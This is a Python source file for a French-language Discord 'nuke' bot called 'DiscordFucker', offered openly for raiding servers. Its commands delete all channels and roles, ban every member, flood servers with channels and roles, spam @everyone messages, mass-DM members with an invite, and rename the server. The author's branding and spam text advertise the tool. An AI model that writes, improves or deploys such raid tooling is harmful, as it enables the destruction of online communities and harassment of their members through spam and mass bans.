from os import name, system
from time import sleep

if name  == "nt":
    system("color 1")
    def clear():
        clear()
else:
    def clear():
        system("clear")

try:
    import discord
except:
    print("Modules non installé !")
    sleep(1.5)
    clear()
    print("Installation des modules requires...\n")
    sleep(0.5)
    try :
        system("pip install discord")
        clear()
        print("Modules installé avec succes.")
        sleep(1)
        clear()
        import discord
    except :
        print("Erreur lors de la tentative d'installation des modules.")
        sleep(1.5)
        print("'pip' n'est probablement pas installé.")
        input()
        quit()

from discord.ext import commands


embed=discord.Embed(title="DiscordFucker !", url="https://github.com/SkZ-S", description="Voici la liste des commandes disponibles : ", color=0x000000)
embed.add_field(name="!help", value="afficher la liste des commandes disponibles", inline=False)
embed.add_field(name="!nuke", value="niquer le serveur totalement (sans ban)", inline=False)
embed.add_field(name="!mininuke", value="niquer le serveur (sans créer de rôles)", inline=False)
embed.add_field(name="!clearall", value="supprimer tous les salons et tous les rôles", inline=False)
embed.add_field(name="!clearchannels", value="supprimer tous les salons(sans supprimer les rôles)", inline=False)
embed.add_field(name="!cleartext", value="supprimer tous les salons textuels", inline=False)
embed.add_field(name="!clearvoice", value="supprimer tous les salons vocaux", inline=False)
embed.add_field(name="!clearroles", value="supprimer tous les rôles existants", inline=False)
embed.add_field(name="!ban", value="ban tous les membres(si possible)", inline=False)
embed.add_field(name="!create", value="créer des salons textuels et vocaux en boucle", inline=False)
embed.add_field(name="!createtext", value="créer des salons textuels en boucle", inline=False)
embed.add_field(name="!createvoice", value="créer des salons vocaux en boucle", inline=False)
embed.add_field(name="!createroles", value="créer des rôles en boucle", inline=False)
embed.add_field(name="!giveroles", value="donner à tous les membres du serveur tous les rôles existants", inline=False)
embed.add_field(name="!spamroles", value="créer et donner des rôles à tous les membres du serveurss", inline=False)
embed.add_field(name="!spam", value="envoyer un message en boucle dans tous les salons textuels", inline=False)
embed.add_field(name="!spammembers", value="envoyer un message en privé à tous les membres du serveur", inline=False)
embed.add_field(name="!server", value="changer le nom et enlever l'icône du serveur", inline=False)
embed.add_field(name="!link", value="recevoir un lien permettant d'apprendre à raid un serveur", inline=False)
embed.add_field(name="**+**", value="pour augmenter le nombre de messages envoyés, envoyer [!spam] plusieurs fois", inline=False)
embed.set_footer(text="Nuke! | >''SkZ™#9999")

link = "https://github.com/SkZ-S"

token = input("[+] Token du bot > ")



spam = "@everyone \nLe serveur est actuellement sous le contrôle de >''SkZ™#9999 ! \n  Si t'es pas content personnelement je m'en blc vien t'éxpliqué sur mon discord 😀 : https://discord.gg/z3H284tffz"

username = ">''SkZ™#9999"

nombre_spam = True

nom_salons = "gg/z3H284tffz"
nombre_salons = 30

nom_roles = "DiscordFucker by >''SkZ"
nombre_roles = 10

nom_serveur = "Serveur de SkZ"

couleur_roles = 0x000001

def spam_member(membre) :
    return f"""Salut {membre}! Viens sur mon serveur je leak mes tout mes projets alors vien le sang ! https://discord.gg/z3H284tffz"""



async def delete_all_channels(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass


async def delete_all_roles(guild):
    for role in guild.roles:
        try:
            if role.name != "@everyone":
                await role.delete()
        except:
            pass

async def spam_members(guild):
    for member in guild.members:
        try:
            await member.send(spam_member(member.name))
        except:
            pass

async def create_roles(guild):
    for _ in range(nombre_roles):
        try:
            await guild.create_role(name = nom_roles, colour= couleur_roles)
        except:
            pass


async def ban_all_members(guild):
    for member in guild.members:
        try:
            await member.ban()
        except:
            pass

async def give_roles(guild):
    for member in guild.members:
        try:
            for role in guild.roles:
                if role.name != "@everyone":
                    await member.add_roles(role)
        except:
            pass

async def create_and_give_roles(guild):
    for _ in range (nombre_roles):
        try:
            for member in guild.members:
                role = await guild.create_role(name = nom_roles, colour = couleur_roles)
                await member.add_roles(role)
        except:
            pass


async def create_voice_channels(guild):
    for _ in range(nombre_salons):
        try:
            await guild.create_voice_channel(name=nom_salons)
        except:
            pass

async def create_text_channels(guild):
    for _ in range(nombre_salons):
        try:
            await guild.create_text_channel(name=nom_salons)
        except:
            pass

async def delete_all_text_channels(guild):
    for channel in guild.channels:
        if str(channel.type) == "text":
            try:
                await channel.delete()
            except:
                pass

async def delete_all_voice_channels(guild):
    for channel in guild.channels:
        if str(channel.type) == "voice":
            try:
                await channel.delete()
            except:
                pass

async def spam_in_channels(guild):
    for _ in range(nombre_spam):
        try:
            for i in guild.channels:
                if str(i.type) != "voice":
                    await i.send(spam)
        except:
            pass

async def nuke(guild):

    await delete_all_roles(guild)

    await create_roles(guild)

    await delete_all_channels(guild)

    await create_text_channels(guild)

    await create_voice_channels(guild)

    await spam_in_channels(guild)


async def mininuke(guild):

    await delete_all_channels(guild)

    await delete_all_roles(guild)

    await create_text_channels(guild)

    await create_voice_channels(guild)

    await spam_in_channels(guild)

    




bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
       
@bot.event
async def on_ready():
    print(f"Le lien permettant de m'ajouter à votre serveur en tant qu'administrateur est : https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot\n")
    print("""La liste de mes commandes est:

!help - afficher la liste des commandes disponibles
!nuke - niquer le serveur totalement (sans ban)
!mininuke - niquer le serveur (sans créer de rôles)
!clearall - supprimer tous les salons et tous les rôles
!clearchannels - supprimer tous les salons(sans supprimer les rôles)
!cleartext - supprimer tous les salons textuels
!clearvoice - supprimer tous les salons vocaux
!clearroles - supprimer tous les rôles existants
!ban - ban tous les membres(si possible)
!create - créer des salons textuels et vocaux en boucle
!createtext - créer des salons textuels en boucle
!createvoice - créer des salons vocaux en boucle
!createroles - créer des rôles en boucle
!giveroles - donner à tous les membres du serveur tous les rôles existants
!spamroles - créer et donner des rôles à tous les membres du serveur
!spam - envoyer un message en boucle dans tous les salons textuels
!spammembers - envoyer un message en privé à tous les membres du serveur
!server - changer le nom et enlever l'icône du serveur
!invite - recevoir un lien permettant d'ajouter le bot à votre serveur
pour augmenter le nombre de messages envoyés, envoyer [!spam] plusieurs fois""")
    activity = discord.Game(name="!help | >''SkZ™#9999", type=1)
    await bot.change_presence(status=discord.Status.idle, activity=activity)


@bot.event
async def on_message(message):
    serveur = message.guild
    if message.content == "!help":
        await message.author.send(embed=embed)

    elif message.content == "!nuke":
        await nuke(serveur)

    elif message.content == "!mininuke":
        await mininuke(serveur)

    elif message.content == "!clearall":
        await delete_all_channels(serveur)
        await serveur.create_text_channel(name="nuke") 
        await delete_all_roles(serveur)  

    elif message.content == "!clearchannels":
        await delete_all_channels(serveur)
        await serveur.create_text_channel(name="nuke")    

    elif message.content == "!cleartext":
        await delete_all_text_channels(serveur)
        await serveur.create_text_channel(name="nuke")  

    elif message.content == "!clearvoice":
        await delete_all_voice_channels(serveur)

    elif message.content == "!clearroles":
        await delete_all_roles(serveur)

    elif message.content == "!ban":
        await ban_all_members(serveur)
    
    elif message.content == "!create":
        await create_text_channels(serveur)
        await create_voice_channels(serveur)
    
    elif message.content == "!createtext":
        await create_text_channels(serveur)
    
    elif message.content == "!createvoice":
        await create_voice_channels(serveur)
    
    elif message.content == "!createroles":
        await create_roles(serveur)

    elif message.content == "!giveroles":
        await give_roles(serveur)

    elif message.content == "!spamroles":
        await create_and_give_roles(serveur)

    elif message.content == "!spam":
        await spam_in_channels(serveur)

    elif message.content == "!spammembers":
        await spam_members(serveur)

    elif message.content == "!server":
        await serveur.edit(name=nom_serveur)
        await serveur.edit(icon=None)

    elif message.content == "!link":
        await message.author.send(link)
        await message.channel.send("Je vous ai envoyé le lien permettant d'apprendre à raid un serveur en privé ^^")
    

    
    




try:
    bot.run(token)
except:
    input("Le token du bot est invalide :/")
    quit()
